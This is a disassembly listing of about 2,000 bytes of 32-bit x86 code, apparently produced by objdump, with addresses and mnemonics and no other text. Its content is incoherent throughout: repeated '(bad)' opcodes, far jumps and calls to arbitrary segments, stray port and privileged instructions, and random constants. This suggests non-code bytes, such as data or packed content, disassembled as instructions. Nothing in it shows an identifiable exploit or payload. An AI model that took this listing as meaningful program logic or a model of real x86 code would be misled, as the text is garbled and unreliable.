  44e50a:	js     0x44e4cd
  44e50c:	pop    ecx
  44e50d:	mov    ebx,0x8c8809f0
  44e512:	call   0x589d:0x6145fb88
  44e519:	cwde   
  44e51a:	xor    DWORD PTR [edx-0x5461c3ab],esp
  44e520:	int3   
  44e521:	(bad)  
  44e522:	mov    edi,0x89cf11d6
  44e527:	stos   BYTE PTR es:[edi],al
  44e528:	fsub   QWORD PTR [ebp+0x5ca8c27f]
  44e52e:	addr16 mov ebp,0x955409a6
  44e534:	mov    DWORD PTR [ebx-0x69],edi
  44e537:	xor    edx,ebp
  44e539:	jl     0x44e594
  44e53b:	popf   
  44e53c:	mov    WORD PTR [esp+ebp*4],?
  44e53f:	push   ebp
  44e540:	retf   0x78a9
  44e543:	sbb    al,0x72
  44e545:	mov    WORD PTR [ebx],fs
  44e547:	jns    0x44e4d2
  44e549:	push   ebx
  44e54a:	mov    ah,0xd6
  44e54c:	bndldx (bad),[esi-0x7bfdb0b4]
  44e553:	scas   al,BYTE PTR es:[edi]
  44e554:	sbb    BYTE PTR [edx+0x6f],bh
  44e557:	mov    ebp,0xe51fd655
  44e55c:	mov    al,0x51
  44e55e:	leave  
  44e55f:	shl    BYTE PTR [ebx+0x36db9a97],1
  44e565:	add    eax,DWORD PTR [esi+0x10]
  44e568:	cmp    DWORD PTR [ebx-0x3d],edi
  44e56b:	add    DWORD PTR [ebp-0x5326e05a],edi
  44e571:	mov    ebp,0x96ae3bd1
  44e576:	jb     0x44e54d
  44e578:	ret    0x3afe
  44e57b:	sahf   
  44e57c:	mov    ch,0x85
  44e57e:	adc    bl,dh
  44e580:	xchg   DWORD PTR [ecx-0x1ea3d389],ebx
  44e586:	pop    edi
  44e587:	(bad)  
  44e588:	xchg   BYTE PTR ss:[esi-0x5105542c],al
  44e58f:	jb     0x44e546
  44e591:	fwait
  44e592:	or     BYTE PTR [ebp-0x60],0x11
  44e596:	pop    eax
  44e597:	bound  edx,QWORD PTR [edx+0x3]
  44e59a:	inc    esi
  44e59b:	push   ebx
  44e59c:	sub    ecx,DWORD PTR [edx]
  44e59e:	daa    
  44e59f:	add    ah,dl
  44e5a1:	pop    ss
  44e5a2:	test   al,0x33
  44e5a4:	sbb    eax,0x4a7416e7
  44e5a9:	cs pop esi
  44e5ab:	loop   0x44e535
  44e5ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e5ae:	fcmovne st,st(7)
  44e5b0:	inc    esp
  44e5b1:	pop    esp
  44e5b2:	lods   al,BYTE PTR ds:[esi]
  44e5b3:	mov    ds:0xf40005bf,al
  44e5b8:	dec    ebp
  44e5b9:	push   ds
  44e5ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e5bc:	fwait
  44e5bd:	pop    es
  44e5be:	pusha  
  44e5bf:	jge    0x44e545
  44e5c1:	sbb    ebx,ebp
  44e5c3:	xor    eax,DWORD PTR [eax]
  44e5c5:	mov    ds:0x2c58f882,al
  44e5ca:	mov    ch,BYTE PTR [esp+edi*2]
  44e5cd:	sbb    eax,0x8a6e591f
  44e5d2:	fcomp  QWORD PTR [ebx-0x64]
  44e5d5:	(bad)  
  44e5d6:	into   
  44e5d7:	mov    dh,0xa0
  44e5d9:	push   cs
  44e5da:	xor    DWORD PTR fs:[ebp+0x7a573a70],0xd3d710f5
  44e5e5:	test   DWORD PTR [eax],esi
  44e5e7:	(bad)  
  44e5e8:	mov    ebx,0xb5874ac9
  44e5ed:	aas    
  44e5ee:	lahf   
  44e5ef:	out    dx,eax
  44e5f0:	mov    BYTE PTR ds:0x666e069d,bl
  44e5f6:	fs aam 0x84
  44e5f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e5fa:	cwde   
  44e5fb:	pop    ebp
  44e5fc:	rol    dl,0x13
  44e5ff:	jg     0x44e58a
  44e601:	mov    DWORD PTR [ecx],esi
  44e603:	rcl    ebp,cl
  44e605:	jmp    0xea78:0x2fa8571
  44e60c:	jbe    0x44e5e4
  44e60e:	jmp    0x75fde3a3
  44e613:	dec    ebx
  44e614:	sbb    DWORD PTR [edx+0x72],ebp
  44e617:	stos   BYTE PTR es:[edi],al
  44e618:	ins    BYTE PTR es:[edi],dx
  44e619:	sbb    al,0xfe
  44e61b:	lds    ebp,FWORD PTR [esi-0x6f5572ad]
  44e621:	jae    0x44e67f
  44e623:	xlat   BYTE PTR ds:[ebx]
  44e624:	pop    ebp
  44e625:	loop   0x44e5be
  44e627:	and    eax,0x751e5525
  44e62c:	xor    ch,0x92
  44e62f:	nop
  44e630:	jno    0x44e615
  44e632:	sub    ebp,DWORD PTR [ebx-0x5e]
  44e635:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e636:	xor    eax,0x191102d4
  44e63b:	and    eax,0xef4be405
  44e640:	hlt    
  44e641:	out    0x7f,al
  44e643:	pop    ebx
  44e644:	jb     0x44e663
  44e646:	test   BYTE PTR [esi+eiz*4-0x1b084ff3],dl
  44e64d:	jo     0x44e60e
  44e64f:	(bad)  
  44e650:	arpl   WORD PTR [edx],ax
  44e652:	test   BYTE PTR [ebp-0x47e02165],0xc7
  44e659:	pop    ss
  44e65a:	jno    0x44e6b7
  44e65c:	imul   edi,ebp,0x63
  44e65f:	aam    0x35
  44e661:	cmc    
  44e662:	sub    BYTE PTR [edi-0x5cf7fa57],bh
  44e668:	mov    al,ds:0x1a45b281
  44e66d:	stos   DWORD PTR es:[edi],eax
  44e66e:	pop    ds
  44e66f:	das    
  44e670:	cmp    DWORD PTR [edi+ebp*4-0x8],0xd56a9c3a
  44e678:	cli    
  44e679:	clc    
  44e67a:	xor    BYTE PTR [edi+0x23aab34a],ah
  44e680:	mov    DWORD PTR [ebp-0x64],ecx
  44e683:	stos   BYTE PTR es:[edi],al
  44e684:	sbb    ah,ah
  44e686:	lods   al,BYTE PTR ds:[esi]
  44e687:	jnp    0x44e6aa
  44e689:	inc    edi
  44e68a:	es call 0x45667b9a
  44e690:	sub    ebx,eax
  44e692:	(bad)  
  44e693:	rcr    edi,cl
  44e695:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44e696:	pop    ds
  44e697:	punpcklbw mm5,DWORD PTR [ecx+0x64eaf7cf]
  44e69e:	xor    dl,ah
  44e6a0:	pop    esp
  44e6a1:	pop    ds
  44e6a2:	inc    edx
  44e6a3:	jecxz  0x44e638
  44e6a5:	or     bl,al
  44e6a7:	pop    ebx
  44e6a8:	mov    DWORD PTR [ecx-0x3b],eax
  44e6ab:	mov    al,0x93
  44e6ad:	jge    0x44e667
  44e6af:	xor    eax,0xa9f20322
  44e6b4:	mov    esp,gs
  44e6b6:	icebp  
  44e6b7:	cs xchg esi,eax
  44e6b9:	je     0x44e6c0
  44e6bb:	push   eax
  44e6bc:	stc    
  44e6bd:	jnp    0x44e6ff
  44e6bf:	mov    ebx,0x945c7427
  44e6c4:	mov    ah,0x8c
  44e6c6:	cwde   
  44e6c7:	push   esp
  44e6c8:	inc    ebp
  44e6c9:	add    dh,BYTE PTR [edx]
  44e6cb:	adc    DWORD PTR [eax+0x67b5f9fe],ebx
  44e6d1:	pop    esi
  44e6d2:	jg     0x44e6f4
  44e6d4:	mov    DWORD PTR [ebx+0x1b],ecx
  44e6d7:	stos   BYTE PTR es:[edi],al
  44e6d8:	mov    ah,0xff
  44e6da:	mov    eax,0xa7fd6b3c
  44e6df:	inc    ecx
  44e6e0:	sbb    al,0x8f
  44e6e2:	pop    ds
  44e6e3:	out    dx,al
  44e6e4:	xchg   edi,eax
  44e6e5:	jmp    0xf19c1bda
  44e6ea:	pusha  
  44e6eb:	mov    ebx,0x700e4961
  44e6f0:	xor    BYTE PTR [edi],ah
  44e6f2:	inc    ebx
  44e6f3:	mov    ecx,0xee4583bf
  44e6f8:	leave  
  44e6f9:	push   edx
  44e6fa:	imul   ebp,DWORD PTR [edx+0x13],0xe64b1fd3
  44e701:	xchg   esi,eax
  44e702:	stc    
  44e703:	leave  
  44e704:	mov    ds:0x1d5d8ca,al
  44e709:	sbb    eax,0xf64ebe55
  44e70e:	xor    DWORD PTR [edx-0x58],edx
  44e711:	push   ds
  44e712:	push   ds
  44e713:	cmc    
  44e714:	xlat   BYTE PTR ds:[ebx]
  44e715:	or     DWORD PTR [ecx],ecx
  44e717:	dec    edx
  44e718:	(bad)  
  44e719:	cli    
  44e71a:	add    al,0x40
  44e71c:	in     ax,0x60
  44e71f:	aaa    
  44e720:	dec    eax
  44e721:	jl     0x44e756
  44e723:	inc    ebp
  44e724:	mov    bl,0xf2
  44e726:	pusha  
  44e727:	xchg   edi,eax
  44e728:	retf   
  44e729:	jnp    0x44e6ca
  44e72b:	push   0xd4a34cba
  44e730:	add    al,BYTE PTR [esi-0x3a]
  44e733:	xchg   esp,eax
  44e734:	mov    eax,ds:0x88dff9dd
  44e739:	ja     0x44e72e
  44e73b:	jg     0x44e78d
  44e73d:	and    BYTE PTR [ebx-0x16],ah
  44e740:	add    bl,BYTE PTR [bp+si]
  44e743:	ret    0xfd81
  44e746:	push   esp
  44e747:	push   esp
  44e748:	push   ss
  44e749:	shl    BYTE PTR [eax-0x43],1
  44e74c:	xchg   edi,eax
  44e74d:	jne    0x44e720
  44e74f:	sbb    esi,DWORD PTR [edx]
  44e751:	frstor [ebx]
  44e753:	xlat   BYTE PTR ds:[ebx]
  44e754:	dec    ebx
  44e755:	mov    ah,0xe3
  44e757:	pop    ds
  44e758:	xchg   esi,eax
  44e759:	and    bl,BYTE PTR [eax-0x1d0e708a]
  44e75f:	add    ah,BYTE PTR [eax-0xc]
  44e762:	shl    DWORD PTR [edx],1
  44e764:	jo     0x44e719
  44e766:	not    BYTE PTR [edx-0x4fe3fdc7]
  44e76c:	push   es
  44e76d:	sub    DWORD PTR [edi],0x1f97e59e
  44e773:	leave  
  44e774:	ret    0x743f
  44e777:	(bad)  
  44e778:	shl    BYTE PTR [ecx+0x12],0xd7
  44e77c:	push   esp
  44e77d:	pushf  
  44e77e:	repnz pop es
  44e780:	jle    0x44e79b
  44e782:	jmp    0x6eed:0x92db979d
  44e789:	add    dl,BYTE PTR ds:0x6e809e08
  44e78f:	xlat   BYTE PTR ds:[ebx]
  44e790:	mov    ?,WORD PTR [eax+0x35]
  44e793:	fsubrp st(6),st
  44e795:	push   ecx
  44e796:	jnp    0x44e79c
  44e798:	mov    eax,0xe8f1fbb
  44e79d:	jl     0x44e729
  44e79f:	add    DWORD PTR ds:0x5341ccfc,ebp
  44e7a5:	jo     0x44e7c6
  44e7a7:	dec    esp
  44e7a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44e7a9:	pusha  
  44e7aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e7ab:	sbb    BYTE PTR [ecx-0x15],cl
  44e7ae:	push   es
  44e7af:	or     al,0x8f
  44e7b1:	ja     0x44e7cb
  44e7b3:	test   BYTE PTR [edi],0x62
  44e7b6:	test   BYTE PTR [ebp-0x2b920964],dh
  44e7bc:	or     eax,0x38716410
  44e7c1:	jns    0x44e838
  44e7c3:	dec    ebx
  44e7c4:	dec    edi
  44e7c5:	mov    ebx,0x2189d4fc
  44e7ca:	(bad)  
  44e7cc:	or     BYTE PTR [edx+0x2537456],al
  44e7d2:	cld    
  44e7d3:	in     al,0x8f
  44e7d5:	scas   al,BYTE PTR es:[edi]
  44e7d6:	mov    bh,0xa0
  44e7d8:	int3   
  44e7d9:	pushf  
  44e7da:	pop    ds
  44e7db:	jns    0x44e778
  44e7dd:	cmc    
  44e7de:	jae    0x44e793
  44e7e0:	ins    BYTE PTR es:[edi],dx
  44e7e1:	dec    edx
  44e7e2:	mov    edx,ebp
  44e7e4:	inc    BYTE PTR [esi]
  44e7e6:	xchg   esp,eax
  44e7e7:	das    
  44e7e8:	clc    
  44e7e9:	shl    DWORD PTR [ebp-0x1d],cl
  44e7ec:	mov    DWORD PTR [ecx+0x5856851e],esi
  44e7f2:	jmp    0xf4a:0x46dc
  44e7f8:	rol    DWORD PTR [edx+0x64875907],1
  44e7fe:	cmp    BYTE PTR [edi-0x77],bl
  44e801:	dec    ebp
  44e802:	mov    ah,0xba
  44e804:	sub    eax,0xca378cc9
  44e809:	add    eax,0x2ef235aa
  44e80e:	inc    esi
  44e80f:	icebp  
  44e810:	dec    esp
  44e811:	jge    0x44e880
  44e813:	dec    ebx
  44e814:	or     esi,DWORD PTR [edx+0x51]
  44e817:	ror    BYTE PTR [ecx],0x34
  44e81a:	in     eax,0xac
  44e81c:	sbb    DWORD PTR [edx],eax
  44e81e:	jmp    0x2b2b:0xa06a53d1
  44e825:	out    0x57,al
  44e827:	pop    ss
  44e828:	sbb    DWORD PTR [ecx-0x5],ebx
  44e82b:	or     al,BYTE PTR es:[edx+0xc]
  44e82f:	inc    ebx
  44e830:	loope  0x44e886
  44e832:	push   eax
  44e833:	test   dl,dh
  44e835:	add    eax,0x19592d9a
  44e83a:	jp     0x44e7bc
  44e83c:	pop    ds
  44e83d:	mov    ds,WORD PTR [edi]
  44e83f:	lods   eax,DWORD PTR ds:[esi]
  44e840:	in     al,dx
  44e841:	aam    0x27
  44e843:	jle    0x44e829
  44e845:	pushf  
  44e846:	inc    ebx
  44e847:	stos   BYTE PTR es:[edi],al
  44e848:	test   BYTE PTR [ebx],al
  44e84a:	inc    edx
  44e84b:	xchg   ebx,eax
  44e84c:	sub    DWORD PTR [ebx+0x189bc0b6],eax
  44e852:	fs mov ebp,0xc8069af0
  44e858:	sub    eax,0x8349540
  44e85d:	(bad)  
  44e85e:	pop    edx
  44e85f:	mov    ds:0x3cd205db,al
  44e864:	push   esp
  44e865:	clc    
  44e866:	push   esi
  44e867:	nop
  44e868:	xchg   edi,eax
  44e869:	cmc    
  44e86a:	pusha  
  44e86b:	xchg   DWORD PTR [edi],edi
  44e86d:	or     DWORD PTR [ecx+0x78f9c8ea],esp
  44e873:	stos   BYTE PTR es:[edi],al
  44e874:	fsub   DWORD PTR [edi-0x6abd25bd]
  44e87a:	stos   DWORD PTR es:[edi],eax
  44e87b:	xor    al,0x7d
  44e87d:	sub    BYTE PTR [ebp+0x688291e],ch
  44e883:	dec    ebp
  44e884:	mov    DWORD PTR [edi+0x46],ebx
  44e887:	and    DWORD PTR [eax+0x6bfd1055],edx
  44e88d:	add    ebx,DWORD PTR [esi-0x4fca7e47]
  44e893:	sbb    eax,0x611fabb2
  44e898:	xchg   edi,eax
  44e899:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e89a:	adc    esi,esi
  44e89c:	dec    esp
  44e89d:	scas   al,BYTE PTR es:[edi]
  44e89e:	js     0x44e874
  44e8a0:	push   ebp
  44e8a1:	xchg   ebx,eax
  44e8a2:	mov    ecx,0xaac10426
  44e8a7:	retf   
  44e8a8:	mov    DWORD PTR [edi-0x29],edx
  44e8ab:	(bad)  
  44e8ac:	or     ebp,DWORD PTR [ebx-0x1e2bc527]
  44e8b2:	jno    0x44e889
  44e8b4:	jl     0x44e8f6
  44e8b6:	cmp    dh,al
  44e8b8:	inc    edx
  44e8b9:	push   ds
  44e8ba:	mov    cl,0xc8
  44e8bc:	adc    BYTE PTR [esi],dh
  44e8be:	(bad)  
  44e8bf:	aad    0xc8
  44e8c1:	inc    edi
  44e8c2:	sahf   
  44e8c3:	add    DWORD PTR ds:0x9592532e,0x6ece72d2
  44e8cd:	sbb    eax,0x2b085ad4
  44e8d2:	lock ror al,0x2c
  44e8d6:	inc    esi
  44e8d7:	fmul   QWORD PTR [ecx+0x75d43aa9]
  44e8dd:	cli    
  44e8de:	sub    eax,0x5602ed6c
  44e8e3:	jbe    0x44e94a
  44e8e5:	sar    BYTE PTR [edx],1
  44e8e7:	mov    ebx,0xf71f7043
  44e8ec:	push   ss
  44e8ed:	sbb    edx,edx
  44e8ef:	call   0xdf2:0xc32dd532
  44e8f6:	xchg   edx,eax
  44e8f7:	shl    DWORD PTR [eax+ecx*1+0x4b7ac18c],1
  44e8fe:	sahf   
  44e8ff:	push   ebx
  44e900:	mov    ah,0x7e
  44e902:	xchg   DWORD PTR gs:[eax],esi
  44e905:	ss pop eax
  44e907:	inc    esi
  44e908:	out    0xb2,eax
  44e90a:	bound  esp,QWORD PTR [ebx+0x20]
  44e90d:	sbb    al,0x10
  44e90f:	sbb    BYTE PTR [esi-0x80],bh
  44e912:	fstp   TBYTE PTR [ecx-0x77b4fc50]
  44e919:	aas    
  44e91a:	in     eax,dx
  44e91b:	ins    BYTE PTR es:[edi],dx
  44e91c:	mov    ebx,0x87e1efa5
  44e921:	add    eax,0x1d53e7c6
  44e926:	mov    dl,0x84
  44e928:	xchg   edx,eax
  44e929:	push   ss
  44e92a:	push   ds
  44e92b:	xchg   edi,eax
  44e92c:	repz mov bh,0x72
  44e92f:	sub    ch,BYTE PTR [ecx+edi*1-0x38024750]
  44e936:	xchg   esi,eax
  44e937:	cmp    eax,0x5acf01f2
  44e93c:	(bad)  
  44e93d:	pop    ds
  44e93e:	lahf   
  44e93f:	test   eax,0xdd1e52fd
  44e944:	pop    es
  44e945:	jns    0x44e8e9
  44e947:	push   ds
  44e948:	shl    BYTE PTR [ecx-0x255e6532],1
  44e94e:	inc    ecx
  44e94f:	push   ebp
  44e950:	and    DWORD PTR [esi],0xf7d48263
  44e956:	pop    DWORD PTR [ecx-0x14fffcf8]
  44e95c:	sbb    eax,0x7266f152
  44e961:	add    al,dh
  44e963:	pusha  
  44e964:	sbb    al,0x73
  44e966:	out    dx,al
  44e967:	jp     0x44e9a4
  44e969:	and    BYTE PTR [ecx-0x13],0x43
  44e96d:	xor    edi,DWORD PTR [edx-0xe]
  44e970:	hlt    
  44e971:	push   ebx
  44e972:	inc    BYTE PTR [edx+0x21c6029b]
  44e978:	inc    edi
  44e979:	callw  0x4f8
  44e97d:	sub    edx,DWORD PTR [edi+0x4f262707]
  44e983:	push   ebp
  44e984:	push   ebx
  44e985:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44e986:	lock adc eax,0xbc36dad8
  44e98c:	fidiv  DWORD PTR [ecx+0x22]
  44e98f:	xchg   edx,eax
  44e990:	mov    DWORD PTR [ecx-0x58],ecx
  44e993:	in     eax,dx
  44e994:	pop    ds
  44e995:	pusha  
  44e996:	mov    edx,DWORD PTR [ecx-0x4d]
  44e999:	mov    edi,DWORD PTR [edx-0x4c]
  44e99c:	or     DWORD PTR [ebp-0x53],ebx
  44e99f:	sbb    esi,esp
  44e9a1:	pop    ds
  44e9a2:	(bad)  
  44e9a3:	aad    0x3a
  44e9a5:	and    esi,ebp
  44e9a7:	loop   0x44e97c
  44e9a9:	in     al,0xbe
  44e9ab:	std    
  44e9ac:	mov    BYTE PTR [edi-0x6b],dl
  44e9af:	mov    esp,ebp
  44e9b1:	mov    bh,0xf
  44e9b3:	or     al,0x91
  44e9b5:	pop    ss
  44e9b6:	call   0x2d040117
  44e9bb:	aaa    
  44e9bc:	lods   al,BYTE PTR ds:[esi]
  44e9bd:	xor    eax,0x1f90500b
  44e9c2:	pushf  
  44e9c3:	mov    esi,0x74405306
  44e9c8:	loopne 0x44e9cc
  44e9ca:	dec    eax
  44e9cb:	aas    
  44e9cc:	mov    ah,0x2e
  44e9ce:	les    eax,FWORD PTR [edx+0x571f6002]
  44e9d4:	js     0x44ea43
  44e9d6:	cmc    
  44e9d7:	loopne 0x44e95b
  44e9d9:	pop    ss
  44e9da:	dec    esi
  44e9db:	aad    0x44
  44e9dd:	fisttp WORD PTR [edi+0x8]
  44e9e0:	mov    dl,0x57
  44e9e2:	and    esi,DWORD PTR ds:0x1941e988
  44e9e8:	inc    esi
  44e9e9:	sub    dh,BYTE PTR es:[ecx+edx*8+0x5]
  44e9ee:	ficomp DWORD PTR [ebp+0x34dc5b40]
  44e9f4:	sti    
  44e9f5:	push   ebx
  44e9f6:	sub    ebp,DWORD PTR [ebp+0x67698b89]
  44e9fc:	pop    ds
  44e9fd:	cmp    DWORD PTR [edi-0x7e],0x6722c24d
  44ea04:	ins    BYTE PTR es:[edi],dx
  44ea05:	cmp    BYTE PTR [ebx],bh
  44ea07:	xlat   BYTE PTR ds:[ebx]
  44ea08:	dec    ecx
  44ea09:	and    cl,al
  44ea0b:	arpl   WORD PTR [ebx+ecx*4-0xa76b1f7],dx
  44ea12:	push   esi
  44ea13:	mov    ebx,0xbd29230d
  44ea18:	jl     0x44ea1c
  44ea1a:	or     BYTE PTR [edi],ch
  44ea1c:	or     eax,0x1879b16e
  44ea21:	aaa    
  44ea22:	gs daa 
  44ea24:	int    0x7e
  44ea26:	lea    edx,[esi]
  44ea28:	xchg   ebx,eax
  44ea29:	test   DWORD PTR [esp+eiz*8+0x154e02f2],ebx
  44ea30:	or     eax,0x2b87aaa0
  44ea35:	outs   dx,BYTE PTR ds:[esi]
  44ea36:	push   ds
  44ea37:	daa    
  44ea38:	dec    eax
  44ea39:	inc    esi
  44ea3a:	and    al,0x68
  44ea3c:	sbb    eax,0xb7591aef
  44ea41:	sbb    DWORD PTR [ecx+ebx*4-0xf],ebp
  44ea45:	push   ds
  44ea46:	add    BYTE PTR [edi],dl
  44ea48:	stos   BYTE PTR es:[edi],al
  44ea49:	aas    
  44ea4a:	lods   eax,DWORD PTR ds:[esi]
  44ea4b:	pusha  
  44ea4c:	cmc    
  44ea4d:	(bad)  
  44ea4e:	sbb    bh,dl
  44ea50:	jae    0x44ea2b
  44ea52:	add    eax,0x209fd85a
  44ea57:	aam    0x69
  44ea59:	shl    DWORD PTR [ecx],cl
  44ea5b:	jmp    0x9188:0xb9d061db
  44ea62:	inc    edi
  44ea63:	mov    ch,BYTE PTR [edi]
  44ea65:	or     eax,0x72b8a1a2
  44ea6a:	xchg   ebx,eax
  44ea6b:	shl    DWORD PTR [edx],cl
  44ea6d:	repz popf 
  44ea6f:	mov    bh,0xd
  44ea71:	fstp   QWORD PTR [edi+0x66]
  44ea74:	jmp    0x323056bb
  44ea79:	push   esp
  44ea7a:	pop    edi
  44ea7b:	pusha  
  44ea7c:	push   edi
  44ea7d:	inc    ebx
  44ea7e:	fcomi  st,st(3)
  44ea80:	sub    al,0x39
  44ea82:	mov    bh,0xd5
  44ea84:	ror    BYTE PTR [edx],1
  44ea86:	and    eax,0x65b0c42e
  44ea8b:	inc    ecx
  44ea8c:	adc    BYTE PTR [ebx+esi*2],bh
  44ea8f:	aam    0x5d
  44ea91:	and    al,0x38
  44ea93:	repz jle 0x44ead2
  44ea96:	hlt    
  44ea97:	aam    0x79
  44ea99:	push   esp
  44ea9a:	cmp    WORD PTR [ebp+0x25],sp
  44ea9e:	fwait
  44ea9f:	repz (bad) 
  44eaa1:	push   edi
  44eaa2:	xchg   ebp,eax
  44eaa3:	mov    ds:0xb1176c2d,al
  44eaa8:	sbb    edx,edi
  44eaaa:	out    dx,eax
  44eaab:	retf   0x1cc1
  44eaae:	push   esp
  44eaaf:	jne    0x44eb1c
  44eab1:	mov    DWORD PTR ds:0xe1c9efb,esi
  44eab7:	(bad)  
  44eab8:	std    
  44eab9:	test   BYTE PTR [eax+0x55],0x5
  44eabd:	retf   
  44eabe:	mov    ebx,0x20035a40
  44eac3:	mov    ebx,0xdfe2933e
  44eac8:	or     eax,0xc2a39603
  44eacd:	lahf   
  44eace:	sub    BYTE PTR [eax],dl
  44ead0:	jecxz  0x44eb36
  44ead2:	jnp    0x44eab3
  44ead4:	(bad)  
  44ead5:	int3   
  44ead6:	adc    edx,DWORD PTR [esp+esi*2]
  44ead9:	or     dh,dl
  44eadb:	push   eax
  44eadc:	js     0x44eae1
  44eade:	sbb    al,BYTE PTR cs:0x843e3930
  44eae5:	push   edx
  44eae6:	pop    ds
  44eae7:	add    DWORD PTR [eax],edx
  44eae9:	cdq    
  44eaea:	pop    edx
  44eaeb:	mov    edi,0xd7b63ae2
  44eaf0:	adc    DWORD PTR [esi-0x72],esp
  44eaf3:	gs (bad) 
  44eaf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  44eaf6:	xor    eax,0x118d1a77
  44eafb:	dec    BYTE PTR [ecx+0x72b37085]
  44eb01:	fistp  WORD PTR [edx+0x6002a0f7]
  44eb07:	pop    es
  44eb08:	int3   
  44eb09:	sbb    eax,esp
  44eb0b:	sub    ebp,DWORD PTR [esi-0x76]
  44eb0e:	pop    ds
  44eb0f:	gs sbb al,0x3c
  44eb12:	imul   esi,DWORD PTR [edx],0xd5f8e94e
  44eb18:	loop   0x44eb2d
  44eb1a:	pop    esp
  44eb1b:	pop    ebp
  44eb1c:	(bad)  
  44eb1d:	icebp  
  44eb1e:	test   BYTE PTR [esi+0x2fb7f97c],dl
  44eb24:	adc    BYTE PTR [edi],dl
  44eb26:	pop    ds
  44eb27:	adc    ebp,DWORD PTR [eax-0x15]
  44eb2a:	fs stos DWORD PTR es:[edi],eax
  44eb2c:	daa    
  44eb2d:	add    bl,BYTE PTR [edx-0x176c4a72]
  44eb33:	and    DWORD PTR [edi+ebp*8+0x62],esi
  44eb37:	cmp    DWORD PTR [edi+0x2e],0xffffffef
  44eb3b:	and    al,0x5a
  44eb3d:	outs   dx,BYTE PTR ds:[esi]
  44eb3e:	adc    edi,DWORD PTR ds:[edi]
  44eb41:	retf   
  44eb42:	std    
  44eb43:	fmul   DWORD PTR [ecx+0x70446be7]
  44eb49:	dec    ecx
  44eb4a:	pop    edi
  44eb4b:	xchg   ecx,eax
  44eb4c:	mov    DWORD PTR [edi],ebx
  44eb4e:	mov    ah,0x7f
  44eb50:	adc    DWORD PTR [ecx],ecx
  44eb52:	repz mov edi,0xd40ef2d6
  44eb58:	jle    0x44eb84
  44eb5a:	fst    QWORD PTR [edi+eiz*2-0x5f]
  44eb5e:	xchg   esi,eax
  44eb5f:	jmp    0x32a1:0x2626b188
  44eb66:	fld    DWORD PTR [esi]
  44eb68:	xor    eax,0x10e11a02
  44eb6d:	(bad)  
  44eb6e:	cld    
  44eb6f:	fwait
  44eb70:	inc    ecx
  44eb71:	dec    eax
  44eb72:	pop    ds
  44eb73:	dec    ebx
  44eb74:	or     BYTE PTR [eax],dh
  44eb76:	mov    edx,0x1d0562a5
  44eb7b:	lds    ecx,FWORD PTR [eax+0x27]
  44eb7e:	and    edi,edx
  44eb80:	daa    
  44eb81:	add    eax,ebp
  44eb83:	and    eax,0x9428231e
  44eb88:	sti    
  44eb89:	mov    edi,0xb854d739
  44eb8e:	push   cs
  44eb8f:	xchg   ecx,eax
  44eb90:	mov    ds,WORD PTR [edi+0x68]
  44eb93:	aad    0x11
  44eb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44eb96:	pop    es
  44eb97:	ja     0x44ebb2
  44eb99:	mov    bh,0x9a
  44eb9b:	sbb    bl,BYTE PTR [ebp+0x15]
  44eb9e:	gs xchg ebp,eax
  44eba0:	jle    0x44ec15
  44eba2:	mov    WORD PTR ds:0x65e4d258,cs
  44eba8:	cdq    
  44eba9:	add    eax,0xd069e1d0
  44ebae:	ror    DWORD PTR [ebx+edx*1],0xb4
  44ebb2:	pusha  
  44ebb3:	jecxz  0x44eb6c
  44ebb5:	cld    
  44ebb6:	xor    eax,0x40dec003
  44ebbb:	aam    0xb8
  44ebbd:	jmp    0xd8534d52
  44ebc2:	mov    ds:0x8b658806,al
  44ebc7:	ret    0x2075
  44ebca:	and    BYTE PTR [esi],bh
  44ebcc:	scas   eax,DWORD PTR es:[edi]
  44ebcd:	add    eax,0x7c929f26
  44ebd2:	repnz push 0xffffffb6
  44ebd5:	and    al,0x1f
  44ebd7:	icebp  
  44ebd8:	add    DWORD PTR [edx+eiz*2-0x1e32c73],edx
  44ebdf:	pop    edi
  44ebe0:	xchg   BYTE PTR ds:0x4258911e,ch
  44ebe6:	push   es
  44ebe7:	inc    esi
  44ebe8:	pop    esp
  44ebe9:	and    DWORD PTR [edi],ebx
  44ebeb:	pop    es
  44ebec:	je     0x44ec39
  44ebee:	enter  0xb1d,0x39
  44ebf2:	mov    bl,0xc6
  44ebf4:	xchg   edx,eax
  44ebf5:	add    bl,dl
  44ebf7:	xor    DWORD PTR [edi-0x442b7f8e],ebp
  44ebfd:	stos   DWORD PTR es:[edi],eax
  44ebfe:	adc    ebp,DWORD PTR [ecx]
  44ec00:	mov    DWORD PTR [ebx-0x63],ebx
  44ec03:	sahf   
  44ec04:	mov    eax,0x3ab910ad
  44ec09:	add    bl,BYTE PTR [eax-0x6c615604]
  44ec0f:	jmp    0x24ce:0xe71fa760
  44ec16:	cmp    DWORD PTR [esi],0xffffffe0
  44ec19:	mov    esi,0xbe3fd4c9
  44ec1e:	and    ah,dh
  44ec20:	inc    eax
  44ec21:	data16 mov ah,0x5b
  44ec24:	mov    DWORD PTR ds:0xe44f6be3,eax
  44ec2a:	(bad)
  44ec2e:	outs   dx,BYTE PTR ds:[esi]
  44ec2f:	and    ebx,esi
  44ec31:	into   
  44ec32:	cmp    BYTE PTR [edx-0x6f6cfd4e],cl
  44ec38:	popa   
  44ec39:	cmp    eax,0x6cdd7d1f
  44ec3e:	lds    ebx,FWORD PTR [ecx]
  44ec40:	les    edx,FWORD PTR [edi+0x35]
  44ec43:	xlat   BYTE PTR ds:[ebx]
  44ec44:	arpl   WORD PTR [eax],di
  44ec46:	or     eax,0x43ebeef4
  44ec4b:	dec    ebp
  44ec4c:	mov    ebp,DWORD PTR [ebp-0x64]
  44ec4f:	jbe    0x44ec2b
  44ec51:	fldenv [ebx+0x33053079]
  44ec57:	xlat   BYTE PTR ds:[ebx]
  44ec58:	push   eax
  44ec59:	int    0x54
  44ec5b:	adc    cl,bl
  44ec5d:	dec    edi
  44ec5e:	mov    ah,0xa1
  44ec60:	mov    DWORD PTR [edi],ebx
